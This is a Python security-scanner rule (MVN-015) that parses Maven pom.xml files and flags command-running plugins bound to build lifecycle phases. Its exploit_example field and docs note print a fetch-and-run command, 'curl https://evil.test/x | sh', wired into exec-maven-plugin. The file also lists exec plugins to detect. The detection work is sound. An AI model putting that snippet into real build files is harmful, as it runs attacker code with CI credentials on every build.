"""MVN-015. pom.xml binds a build-time code-execution plugin to the lifecycle."""
from __future__ import annotations

import re
import xml.etree.ElementTree as ET

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import PomFile

RULE = Rule(
    id="MVN-015",
    title="pom.xml binds a build-time code-execution plugin to the lifecycle",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-1", "CICD-SEC-3"),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-94", "CWE-829"),
    recommendation=(
        "Review every lifecycle-bound execution of a "
        "command-running plugin (``exec-maven-plugin``, "
        "``maven-antrun-plugin``, ``gmavenplus-plugin`` / "
        "``groovy-maven-plugin``, ``frontend-maven-plugin``). When "
        "such a plugin has an ``<execution>`` tied to a phase, it "
        "runs arbitrary host commands on every ``mvn package`` / "
        "``install`` / ``deploy``, with the build's privileges (CI "
        "runner write access, deploy keys, cloud credentials). "
        "Pinning the plugin version (MVN-012) does NOT remove this "
        "risk: a perfectly pinned ``exec-maven-plugin`` still runs "
        "whatever command its ``<configuration>`` names. Confirm "
        "the command and its inputs are trusted and constant (no "
        "downloaded script, no ``${}`` that an attacker can "
        "influence), move genuinely necessary code generation "
        "behind a reviewed, checked-in script, and drop any "
        "execution that isn't needed. Treat these executions as the "
        "build-RCE primitive they are."
    ),
    docs_note=(
        "Re-parses ``pom.xml`` and walks "
        "``<build><plugins><plugin>``, "
        "``<build><pluginManagement>``, and "
        "``<profile><build>`` plugins. Fires when a known "
        "command-running plugin (``exec-maven-plugin``, "
        "``maven-antrun-plugin``, ``gmavenplus-plugin``, "
        "``groovy-maven-plugin``, ``frontend-maven-plugin``) "
        "carries at least one ``<executions><execution>`` "
        "binding, which is what wires it into the build lifecycle "
        "so it runs automatically.\n\n"
        "Distinct from MVN-012, which only checks that a plugin's "
        "``<version>`` is pinned. A plugin can be perfectly pinned "
        "and still execute ``curl evil | sh`` from its "
        "configuration; MVN-012 passes it, MVN-015 catches the "
        "lifecycle binding. Scoped to ``pom.xml`` (Gradle's "
        "equivalent ``exec`` / ``JavaExec`` tasks are a separate "
        "surface)."
    ),
    known_fp=(
        "Lifecycle-bound code generation is common and often "
        "legitimate (``frontend-maven-plugin`` building a JS bundle, "
        "``exec-maven-plugin`` running a checked-in generator). The "
        "rule flags the build-time-execution surface so a reviewer "
        "can confirm the command and its inputs are trusted and "
        "constant; suppress per pom with a rationale once verified.",
    ),
    incident_refs=(
        "Build-time plugin execution is the dominant real-world "
        "Maven build-RCE primitive: a poisoned or misconfigured "
        "``exec`` / ``antrun`` execution runs attacker-chosen "
        "commands on the build host. Same class as the npm "
        "lifecycle-script attacks and the xz-utils build-step "
        "backdoor, expressed through Maven's plugin lifecycle.",
    ),
    exploit_example=(
        "<!-- Vulnerable: exec-maven-plugin bound to a build phase. -->\n"
        "<plugin>\n"
        "  <groupId>org.codehaus.mojo</groupId>\n"
        "  <artifactId>exec-maven-plugin</artifactId>\n"
        "  <version>3.1.0</version>  <!-- pinned, yet still runs! -->\n"
        "  <executions>\n"
        "    <execution>\n"
        "      <phase>generate-sources</phase>\n"
        "      <goals><goal>exec</goal></goals>\n"
        "      <configuration>\n"
        "        <executable>/bin/sh</executable>\n"
        "        <arguments><argument>-c</argument>\n"
        "          <argument>curl https://evil.test/x | sh</argument>\n"
        "        </arguments>\n"
        "      </configuration>\n"
        "    </execution>\n"
        "  </executions>\n"
        "</plugin>\n"
        "\n"
        "<!-- Attack: every `mvn package` runs the script in the\n"
        "     generate-sources phase, on every dev machine and CI\n"
        "     runner, before any test or sandbox. MVN-012 passes\n"
        "     this (the version is pinned); MVN-015 flags it. -->\n"
        "\n"
        "<!-- Safe: drop the execution, or run a reviewed,\n"
        "     checked-in generator with constant inputs. -->"
    ),
)


_MAVEN_NS_RE = re.compile(r"^\{[^}]+\}")

#: Plugins whose goals run arbitrary host commands / scripts. The
#: artifactId is the discriminator; groupId is reported but not
#: required to match (forks republish under different groups).
_EXEC_PLUGINS: frozenset[str] = frozenset({
    "exec-maven-plugin",
    "maven-antrun-plugin",
    "gmavenplus-plugin",
    "groovy-maven-plugin",
    "gmaven-plugin",
    "frontend-maven-plugin",
})


def _strip_ns(tag: str) -> str:
    return _MAVEN_NS_RE.sub("", tag)


def _findtext_local(elem: ET.Element, name: str) -> str:
    for child in elem:
        if _strip_ns(child.tag) == name:
            return (child.text or "").strip()
    return ""


def _find_child_local(elem: ET.Element, name: str) -> ET.Element | None:
    for child in elem:
        if _strip_ns(child.tag) == name:
            return child
    return None


def _findall_local(elem: ET.Element, name: str) -> list[ET.Element]:
    return [c for c in elem if _strip_ns(c.tag) == name]


def _execution_phases(plugin: ET.Element) -> list[str]:
    """Return the bound phase(s) for a plugin, or ``[]`` when it has
    no ``<executions><execution>`` (i.e. not wired into the build)."""
    executions = _find_child_local(plugin, "executions")
    if executions is None:
        return []
    phases: list[str] = []
    for execution in _findall_local(executions, "execution"):
        phase = _findtext_local(execution, "phase")
        phases.append(phase or "(default-phase)")
    return phases


def _walk_exec_plugins(root: ET.Element) -> list[tuple[str, str]]:
    """Return ``(coordinate, phase-summary)`` for every known exec
    plugin that carries a lifecycle binding."""
    out: list[tuple[str, str]] = []

    def walk_build(build: ET.Element) -> None:
        containers = [build]
        pm = _find_child_local(build, "pluginManagement")
        if pm is not None:
            containers.append(pm)
        for container in containers:
            plugins_node = _find_child_local(container, "plugins")
            if plugins_node is None:
                continue
            for plug in _findall_local(plugins_node, "plugin"):
                artifact_id = _findtext_local(plug, "artifactId")
                if artifact_id not in _EXEC_PLUGINS:
                    continue
                phases = _execution_phases(plug)
                if not phases:
                    continue
                group_id = _findtext_local(plug, "groupId") or "(default)"
                out.append((
                    f"{group_id}:{artifact_id}",
                    ", ".join(phases[:3]),
                ))

    build = _find_child_local(root, "build")
    if build is not None:
        walk_build(build)
    profiles = _find_child_local(root, "profiles")
    if profiles is not None:
        for profile in _findall_local(profiles, "profile"):
            inner_build = _find_child_local(profile, "build")
            if inner_build is not None:
                walk_build(inner_build)
    return out


def check(pom: PomFile) -> Finding:
    if pom.is_settings or not pom.path.endswith(".xml"):
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=pom.path,
            description="No project build plugins to audit.",
            recommendation=RULE.recommendation, passed=True,
        )
    try:
        root = ET.fromstring(pom.text)
    except ET.ParseError:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=pom.path,
            description="pom.xml parse error; can't audit plugins.",
            recommendation=RULE.recommendation, passed=True,
        )
    offenders = _walk_exec_plugins(root)
    locations: list[Location] = []
    for coord, _phases in offenders:
        artifact = coord.split(":", 1)[-1]
        marker = f"<artifactId>{artifact}</artifactId>"
        line_no = 1
        if marker in pom.text:
            line_no = pom.text[:pom.text.index(marker)].count("\n") + 1
        locations.append(Location(
            path=pom.path, start_line=line_no, end_line=line_no,
        ))
    passed = not offenders
    desc = (
        "No command-running plugin is bound to the build lifecycle."
        if passed else
        f"{len(offenders)} command-running plugin execution(s): "
        + "; ".join(
            f"{coord} [{phases}]" for coord, phases in offenders[:3]
        )
        + f"{' …' if len(offenders) > 3 else ''}. Each runs "
        f"arbitrary host commands during the build with the "
        f"runner's privileges; pinning the version (MVN-012) does "
        f"not remove this."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=pom.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
